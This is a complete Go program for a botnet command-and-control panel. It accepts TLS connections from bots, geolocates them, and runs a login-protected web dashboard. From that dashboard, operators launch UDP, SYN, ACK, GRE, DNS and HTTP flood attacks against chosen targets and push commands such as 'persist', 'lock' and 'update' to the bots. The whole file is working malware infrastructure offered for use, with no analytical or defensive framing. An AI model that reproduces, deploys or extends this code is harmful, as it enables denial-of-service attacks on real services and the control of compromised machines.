package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"log"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/gorilla/websocket"
	"golang.org/x/time/rate"
)

const (
	USERS_FILE         = "users.json"
	BOT_SERVER_IP      = "0.0.0.0"
	BOT_SERVER_PORT    = "7002"
	botCleanupInterval = 5 * time.Minute
	heartbeatInterval  = 30 * time.Second
	WEB_SERVER_IP      = "0.0.0.0"
	WEB_SERVER_PORT    = "443"
	CERT_FILE          = "server.crt"
	KEY_FILE           = "server.key"
	SESSION_TIMEOUT    = 30 * time.Minute
	writeWait          = 30 * time.Second
	pongWait           = 90 * time.Second
	pingPeriod         = (pongWait * 9) / 10
)

var (
	botConnLimiter = rate.NewLimiter(rate.Every(5*time.Second), 1)
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

type Metrics struct {
	BotCount      int          `json:"botCount"`
	ActiveAttacks int          `json:"activeAttacks"`
	Attacks       []AttackInfo `json:"attacks"`
	Bots          []Bot        `json:"bots"`
}

type User struct {
	Username string    `json:"Username"`
	Password string    `json:"Password"`
	Expire   time.Time `json:"Expire"`
	Level    string    `json:"Level"`
}

type Attack struct {
	Method   string        `json:"method"`
	Target   string        `json:"target"`
	Port     string        `json:"port"`
	Duration time.Duration `json:"duration"`
	Start    time.Time     `json:"start"`
}

type Bot struct {
	Arch          string    `json:"arch"`
	Conn          net.Conn  `json:"-"`
	IP            string    `json:"ip"`
	Time          time.Time `json:"time"`
	Country       string    `json:"country"`
	City          string    `json:"city"`
	Region        string    `json:"region"`
	Cores         int       `json:"cores"`
	RAM           float64   `json:"ram"`
	Latitude      float64   `json:"lat"`
	Longitude     float64   `json:"lon"`
	ISP           string    `json:"isp"`
	ASN           string    `json:"asn"`
	LastHeartbeat time.Time `json:"last_heartbeat"`
}

type DashboardData struct {
	User           User
	BotCount       int
	OngoingAttacks []AttackInfo
	Bots           []Bot
	Users          []User
	FlashMessage   string
	BotsJSON       template.JS
}

type AttackInfo struct {
	Method    string
	Target    string
	Port      string
	Duration  string
	Remaining string
	ID        string
}

var (
	bots           []Bot
	botCount       int
	botCountLock   sync.Mutex
	botConns       []*net.Conn
	ongoingAttacks = make(map[string]Attack)
	sessions       = make(map[string]User)
	sessionLock    sync.Mutex
)

func main() {
	if !fileExists(CERT_FILE) || !fileExists(KEY_FILE) {
		generateSelfSignedCert()
	}

	if !fileExists(USERS_FILE) {
		createRootUser()
	}

	go startBotServer()
	go startBotCleanup()
	startWebServer()
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func generateSelfSignedCert() {
	cert := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: "localhost",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	certBytes, _ := x509.CreateCertificate(rand.Reader, cert, cert, &priv.PublicKey, priv)

	certOut, _ := os.Create(CERT_FILE)
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
	certOut.Close()

	keyOut, _ := os.OpenFile(KEY_FILE, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()
}

func generateChallenge() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("WebSocket upgrade error:", err)
		return
	}
	defer ws.Close()

	ws.SetReadDeadline(time.Now().Add(pongWait))
	ws.SetPongHandler(func(string) error {
		ws.SetReadDeadline(time.Now().Add(pongWait))
		return nil
	})

	ticker := time.NewTicker(pingPeriod)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			ws.SetWriteDeadline(time.Now().Add(writeWait))
			if err := ws.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		default:
			botCountLock.Lock()
			currentBots := getBots()
			activeBots := make([]Bot, 0)
			for _, b := range currentBots {
				if time.Since(b.LastHeartbeat) <= 2*heartbeatInterval {
					activeBots = append(activeBots, b)
				}
			}
			botCountLock.Unlock()

			metrics := Metrics{
				BotCount:      len(activeBots),
				ActiveAttacks: len(ongoingAttacks),
				Attacks:       getOngoingAttacks(),
				Bots:          activeBots,
			}

			ws.SetWriteDeadline(time.Now().Add(writeWait))
			if err := ws.WriteJSON(metrics); err != nil {
				log.Printf("WebSocket write error: %v", err)
				return
			}
			time.Sleep(1 * time.Second)
		}
	}
}

func sendChallenge(conn net.Conn) (string, error) {
	challenge := generateChallenge()
	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", challenge)
	return challenge, err
}

func verifyResponse(conn net.Conn, challenge string) (bool, error) {
	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil {
		return false, err
	}
	return strings.TrimSpace(response) == computeExpectedResponse(challenge), nil
}

func computeExpectedResponse(challenge string) string {
	return fmt.Sprintf("%x", sha256.Sum256([]byte(challenge+"SALT")))
}

func createRootUser() {
	rootUser := User{
		Username: "root",
		Password: randomString(12),
		Expire:   time.Now().AddDate(1, 0, 0),
		Level:    "Owner",
	}
	bytes, _ := json.MarshalIndent([]User{rootUser}, "", "  ")
	os.WriteFile(USERS_FILE, bytes, 0600)
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		b[i] = chars[n.Int64()]
	}
	return string(b)
}

func getGeoLocation(ip string) (country, city, region string, lat, lon float64, err error) {
	if ip == "127.0.0.1" || ip == "::1" || ip == "localhost" {
		return "Local", "Local Network", "Internal", 0, 0, nil
	}

	host, _, _ := net.SplitHostPort(ip)
	ip = host

	resp, err := http.Get(fmt.Sprintf("http://www.geoplugin.net/json.gp?ip=%s", ip))
	if err != nil {
		return "", "", "", 0, 0, err
	}
	defer resp.Body.Close()
	var data struct {
		Country   string  `json:"geoplugin_countryName"`
		City      string  `json:"geoplugin_city"`
		Region    string  `json:"geoplugin_regionName"`
		Latitude  float64 `json:"geoplugin_latitude,string"`
		Longitude float64 `json:"geoplugin_longitude,string"`
		Error     bool    `json:"error"`
	}

	json.NewDecoder(resp.Body).Decode(&data)
	if data.Error {
		return "", "", "", 0, 0, nil
	}

	return data.Country, data.City, data.Region, data.Latitude, data.Longitude, nil
}

func startBotServer() {
	cert, _ := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	listener, _ := tls.Listen("tcp", fmt.Sprintf("%s:%s", BOT_SERVER_IP, BOT_SERVER_PORT), tlsConfig)
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go handleBotConnection(conn)
	}
}

func isPrivateIP(ip net.IP) bool {
	privateBlocks := []*net.IPNet{
		{IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
		{IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
		{IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
		{IP: net.ParseIP("127.0.0.0"), Mask: net.CIDRMask(8, 32)},
	}

	for _, block := range privateBlocks {
		if block.Contains(ip) {
			return true
		}
	}
	return false
}

func isValidTarget(target string) bool {
	if ip := net.ParseIP(target); ip != nil {
		return !isPrivateIP(ip)
	}

	if matched, _ := regexp.MatchString(`^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$`, target); matched {
		return true
	}

	return false
}

func isValidPort(portStr string) bool {
	port, err := strconv.Atoi(portStr)
	return err == nil && port > 0 && port <= 65535
}

func isValidMethod(method string) bool {
	validMethods := map[string]bool{
		"!udpflood": true,
		"!udpsmart": true,
		"!tcpflood": true,
		"!synflood": true,
		"!ackflood": true,
		"!greflood": true,
		"!dns":      true,
		"!http":     true,
	}
	return validMethods[method]
}

func sendToBots(command string) error {
	if !isValidCommand(command) {
		return fmt.Errorf("invalid command")
	}

	botCountLock.Lock()
	defer botCountLock.Unlock()

	var lastErr error
	for _, bot := range bots {
		if bot.Conn != nil {
			bot.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err := bot.Conn.Write([]byte(command + "\n"))
			if err != nil {
				lastErr = err
				log.Printf("Error sending to bot %s: %v", bot.IP, err)
			}
		}
	}

	return lastErr
}

func isValidCommand(cmd string) bool {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return false
	}

	switch parts[0] {
	case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
		return len(parts) == 4 && isValidTarget(parts[1]) && isValidPort(parts[2])
	case "STOP", "PING", "kill", "update", "lock", "persist":
		return true
	default:
		return false
	}
}

func handleBotConnection(conn net.Conn) {
	if !botConnLimiter.Allow() {
		conn.Close()
		return
	}

	defer func() {
		conn.Close()
		decrementBotCount()
		removeBot(conn)
	}()

	challenge, err := sendChallenge(conn)
	if err != nil {
		log.Printf("Error sending challenge: %v", err)
		return
	}

	valid, err := verifyResponse(conn, challenge)
	if err != nil || !valid {
		log.Printf("Invalid challenge response: %v", err)
		return
	}

	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	newBot := Bot{
		Conn:          conn,
		IP:            ip,
		Time:          time.Now(),
		LastHeartbeat: time.Now(),
	}

	country, city, region, lat, lon, err := getGeoLocation(ip)
	if err == nil {
		newBot.Country = country
		newBot.City = city
		newBot.Region = region
		newBot.Latitude = lat
		newBot.Longitude = lon
	}

	botCountLock.Lock()
	bots = append(bots, newBot)
	botCount = len(bots)
	botConns = append(botConns, &conn)
	botCountLock.Unlock()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		text := scanner.Text()
		conn.SetDeadline(time.Now().Add(heartbeatInterval * 2))

		switch {
		case strings.HasPrefix(text, "PONG:"):
			parts := strings.Split(text, ":")
			if len(parts) >= 4 {
				updateBotInfo(conn, parts[1], parts[2], parts[3])
			}
		case strings.HasPrefix(text, "HEARTBEAT:"):
			parts := strings.Split(text, ":")
			if len(parts) >= 4 {
				updateBotInfo(conn, parts[1], parts[2], parts[3])
			}
			updateBotHeartbeat(conn)
		}
	}
}

func updateBotInfo(conn net.Conn, arch, coresStr, ramStr string) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].Arch = arch
			if cores, err := strconv.Atoi(coresStr); err == nil {
				bots[i].Cores = cores
			}
			if ram, err := strconv.ParseFloat(ramStr, 64); err == nil {
				bots[i].RAM = ram
			}
			break
		}
	}
}

func updateBotHeartbeat(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].LastHeartbeat = time.Now()
			break
		}
	}
}

func removeBot(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots = append(bots[:i], bots[i+1:]...)
			break
		}
	}

	for i, botConn := range botConns {
		if *botConn == conn {
			botConns = append(botConns[:i], botConns[i+1:]...)
			break
		}
	}

	botCount = len(bots)
}

func startBotCleanup() {
	ticker := time.NewTicker(botCleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		cleanupStaleBots()
	}
}

func cleanupStaleBots() {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	threshold := 2 * heartbeatInterval
	var activeBots []Bot

	for _, b := range bots {
		if time.Since(b.LastHeartbeat) <= threshold {
			activeBots = append(activeBots, b)
		} else if b.Conn != nil {
			b.Conn.Close()
		}
	}

	bots = activeBots
	botCount = len(bots)
}

func isValidIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip != nil {
		if isPrivateIP(ip) {
			return !isPrivateIP(ip)
		}
		return true
	}

	if _, err := net.LookupHost(ipStr); err == nil {
		return true
	}

	return false
}

func validatePassword(password string) error {
	if len(password) < 12 {
		return fmt.Errorf("password must be at least 12 characters")
	}

	var (
		hasUpper   bool
		hasLower   bool
		hasDigit   bool
		hasSpecial bool
	)

	for _, c := range password {
		switch {
		case unicode.IsUpper(c):
			hasUpper = true
		case unicode.IsLower(c):
			hasLower = true
		case unicode.IsDigit(c):
			hasDigit = true
		case unicode.IsPunct(c) || unicode.IsSymbol(c):
			hasSpecial = true
		}
	}

	if !hasUpper || !hasLower || !hasDigit || !hasSpecial {
		return fmt.Errorf("password must contain uppercase, lowercase, digit and special characters")
	}

	return nil
}

func getUniqueCountries(bots []Bot) int {
	countries := make(map[string]bool)
	for _, b := range bots {
		if b.Country != "" {
			countries[b.Country] = true
		}
	}
	return len(countries)
}

func startWebServer() {
	funcMap := template.FuncMap{
		"div": func(a, b uint64) float64 {
			if b == 0 {
				return 0
			}
			return float64(a) / float64(b)
		},
		"now": func() time.Time {
			return time.Now()
		},
		"sub": func(a, b uint64) uint64 {
			return a - b
		},
		"formatGB": func(bytes uint64) float64 {
			return float64(bytes) / 1073741824.0
		},
		"getUniqueCountries": getUniqueCountries,
		"isActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
	}

	tmpl := template.Must(template.New("").Funcs(funcMap).ParseGlob("templates/*.html"))

	server := &http.Server{
		Addr: fmt.Sprintf("%s:%s", WEB_SERVER_IP, WEB_SERVER_PORT),
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS13,
			PreferServerCipherSuites: true,
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
			},
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
			},
			SessionTicketsDisabled: true,
		},
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		sessionID := getSessionCookie(r)
		if _, exists := getSession(sessionID); exists {
			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
			return
		}

		tmpl.ExecuteTemplate(w, "login.html", nil)
	})

	http.HandleFunc("/ws", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			handleWebSocket(w, r)
		}))

	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")

		if exists, user := authUser(username, password); exists {
			newSessionID := randomString(64)
			oldSessionID := getSessionCookie(r)
			if oldSessionID != "" {
				clearSession(oldSessionID)
			}

			setSession(newSessionID, *user)
			http.SetCookie(w, &http.Cookie{
				Name:     "session",
				Value:    newSessionID,
				Path:     "/",
				Secure:   true,
				HttpOnly: true,
				MaxAge:   3600,
				SameSite: http.SameSiteStrictMode,
			})

			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		} else {
			tmpl.ExecuteTemplate(w, "login.html", struct{ Error string }{"Invalid username or password"})
		}
	})

	http.HandleFunc("/dashboard", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			data := DashboardData{
				User:           user,
				BotCount:       getBotCount(),
				OngoingAttacks: getOngoingAttacks(),
				Bots:           getBots(),
				Users:          getUsers(),
			}

			botsJSON, _ := json.Marshal(data.Bots)
			data.BotsJSON = template.JS(botsJSON)

			if flash := r.URL.Query().Get("flash"); flash != "" {
				data.FlashMessage = flash
			}

			tmpl.ExecuteTemplate(w, "dashboard.html", data)
		}))

	http.HandleFunc("/admin-command", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}

			if user.Level != "Owner" && user.Level != "Admin" {
				http.Error(w, "Permission denied", http.StatusForbidden)
				return
			}

			command := r.FormValue("command")
			if command == "" {
				http.Error(w, "No command provided", http.StatusBadRequest)
				return
			}

			if err := sendToBots(command); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}

			w.Write([]byte("Command sent successfully"))
		}))

	http.HandleFunc("/attack", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
				return
			}

			method := r.FormValue("method")
			ip := r.FormValue("ip")
			port := r.FormValue("port")
			duration := r.FormValue("duration")

			if !isValidMethod(method) {
				http.Redirect(w, r, "/dashboard?flash=Invalid attack method", http.StatusSeeOther)
				return
			}

			if !isValidIP(ip) {
				http.Redirect(w, r, "/dashboard?flash=Invalid target IP/hostname", http.StatusSeeOther)
				return
			}

			if !isValidPort(port) {
				http.Redirect(w, r, "/dashboard?flash=Invalid port number", http.StatusSeeOther)
				return
			}

			dur, err := strconv.Atoi(duration)
			if err != nil || dur <= 0 || dur > 300 {
				http.Redirect(w, r, "/dashboard?flash=Invalid duration (1-300 seconds)", http.StatusSeeOther)
				return
			}

			if len(ongoingAttacks) >= 3 {
				http.Redirect(w, r, "/dashboard?flash=Maximum attack limit reached", http.StatusSeeOther)
				return
			}

			if method == "!dns" {
				portInt, _ := strconv.Atoi(port)
				if portInt != 53 {
					http.Redirect(w, r, "/dashboard?flash=DNS attacks must target port 53", http.StatusSeeOther)
					return
				}
			}

			attackID := randomString(8)
			ongoingAttacks[attackID] = Attack{
				Method:   method,
				Target:   ip,
				Port:     port,
				Duration: time.Duration(dur) * time.Second,
				Start:    time.Now(),
			}

			command := fmt.Sprintf("%s %s %s %d", method, ip, port, dur)
			sendToBots(command)

			go func(id string, dur time.Duration) {
				time.Sleep(dur)
				delete(ongoingAttacks, id)
			}(attackID, time.Duration(dur)*time.Second)

			http.Redirect(w, r, "/dashboard?flash=Attack launched successfully", http.StatusSeeOther)
		}))

	http.HandleFunc("/stop-all-attacks", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if r.Method != "POST" {
				http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
				return
			}

			if len(ongoingAttacks) == 0 {
				http.Error(w, "No active attacks to stop", http.StatusBadRequest)
				return
			}

			for id := range ongoingAttacks {
				delete(ongoingAttacks, id)
			}

			sendToBots("STOP ALL")
			w.Write([]byte("All attacks stopped"))
		}))

	http.HandleFunc("/stop-attack", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			attackID := r.URL.Query().Get("id")
			if attackID == "" {
				http.Redirect(w, r, "/dashboard?flash=Invalid attack ID", http.StatusSeeOther)
				return
			}

			attack, exists := ongoingAttacks[attackID]
			if !exists {
				http.Redirect(w, r, "/dashboard?flash=Attack not found", http.StatusSeeOther)
				return
			}

			sendToBots(fmt.Sprintf("STOP %s", attack.Target))
			delete(ongoingAttacks, attackID)
			http.Redirect(w, r, "/dashboard?flash=Attack stopped", http.StatusSeeOther)
		}))

	http.HandleFunc("/add-user", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if user.Level != "Owner" {
				http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
				return
			}

			if r.Method != "POST" {
				http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
				return
			}

			username := r.FormValue("username")
			password := r.FormValue("password")
			level := r.FormValue("level")

			if username == "" || password == "" || level == "" {
				http.Redirect(w, r, "/dashboard?flash=Missing user information", http.StatusSeeOther)
				return
			}

			if err := validatePassword(password); err != nil {
				http.Redirect(w, r, "/dashboard?flash="+url.QueryEscape(err.Error()), http.StatusSeeOther)
				return
			}

			users := getUsers()
			users = append(users, User{
				Username: username,
				Password: password,
				Expire:   time.Now().AddDate(1, 0, 0),
				Level:    level,
			})

			saveUsers(users)
			http.Redirect(w, r, "/dashboard?flash=User added successfully", http.StatusSeeOther)
		}))

	http.HandleFunc("/delete-user", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			if user.Level != "Owner" {
				http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
				return
			}

			username := r.URL.Query().Get("username")
			if username == "" {
				http.Redirect(w, r, "/dashboard?flash=Invalid username", http.StatusSeeOther)
				return
			}

			if err := deleteUser(username); err != nil {
				http.Redirect(w, r, "/dashboard?flash=Error deleting user: "+err.Error(), http.StatusSeeOther)
				return
			}

			http.Redirect(w, r, "/dashboard?flash=User deleted successfully", http.StatusSeeOther)
		}))

	http.HandleFunc("/logout", func(w http.ResponseWriter, r *http.Request) {
		sessionID := getSessionCookie(r)
		if sessionID != "" {
			clearSession(sessionID)
		}

		http.SetCookie(w, &http.Cookie{
			Name:     "session",
			Value:    "",
			Path:     "/",
			MaxAge:   -1,
			Secure:   true,
			HttpOnly: true,
			SameSite: http.SameSiteStrictMode,
		})

		http.Redirect(w, r, "/", http.StatusSeeOther)
	})

	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	log.Fatal(server.ListenAndServeTLS(CERT_FILE, KEY_FILE))
}

func requireAuth(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessionID := getSessionCookie(r)
		if sessionID == "" {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}

		user, exists := getSession(sessionID)
		if !exists {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}

		handler(w, r, user)
	}
}

func getSessionCookie(r *http.Request) string {
	cookie, err := r.Cookie("session")
	if err != nil {
		return ""
	}
	return cookie.Value
}

func setSession(id string, user User) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	sessions[id] = user
}

func getSession(sessionID string) (User, bool) {
	sessionLock.Lock()
	defer sessionLock.Unlock()

	user, exists := sessions[sessionID]
	if !exists {
		return User{}, false
	}

	if time.Since(user.Expire) > SESSION_TIMEOUT {
		delete(sessions, sessionID)
		return User{}, false
	}

	return user, true
}

func clearSession(id string) {
	sessionLock.Lock()
	defer sessionLock.Unlock()
	delete(sessions, id)
}

func authUser(username, password string) (bool, *User) {
	users := getUsers()
	for _, user := range users {
		if user.Username == username && user.Password == password {
			if time.Now().After(user.Expire) {
				return false, nil
			}
			return true, &user
		}
	}
	return false, nil
}

func getUsers() []User {
	data, _ := os.ReadFile(USERS_FILE)
	var users []User
	json.Unmarshal(data, &users)
	return users
}

func deleteUser(username string) error {
	users := getUsers()
	var updatedUsers []User

	for _, user := range users {
		if user.Username != username {
			updatedUsers = append(updatedUsers, user)
		}
	}

	if len(updatedUsers) == len(users) {
		return fmt.Errorf("user not found")
	}

	return saveUsers(updatedUsers)
}

func saveUsers(users []User) error {
	data, _ := json.MarshalIndent(users, "", "  ")
	return os.WriteFile(USERS_FILE, data, 0600)
}

func getOngoingAttacks() []AttackInfo {
	var attacks []AttackInfo

	for id, attack := range ongoingAttacks {
		remaining := time.Until(attack.Start.Add(attack.Duration))
		if remaining <= 0 {
			delete(ongoingAttacks, id)
			continue
		}

		attacks = append(attacks, AttackInfo{
			Method:    attack.Method,
			Target:    attack.Target,
			Port:      attack.Port,
			Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
			Remaining: formatDuration(remaining),
			ID:        id,
		})
	}

	return attacks
}

func formatDuration(d time.Duration) string {
	hours := int(d.Hours())
	minutes := int(d.Minutes()) % 60
	seconds := int(d.Seconds()) % 60

	if hours > 0 {
		return fmt.Sprintf("%dh%dm%ds", hours, minutes, seconds)
	} else if minutes > 0 {
		return fmt.Sprintf("%dm%ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

func getBots() []Bot {
	var activeBots []Bot
	for _, b := range bots {
		if b.Conn != nil {
			activeBots = append(activeBots, b)
		}
	}
	return activeBots
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	return botCount
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	if botCount > 0 {
		botCount--
	}
}
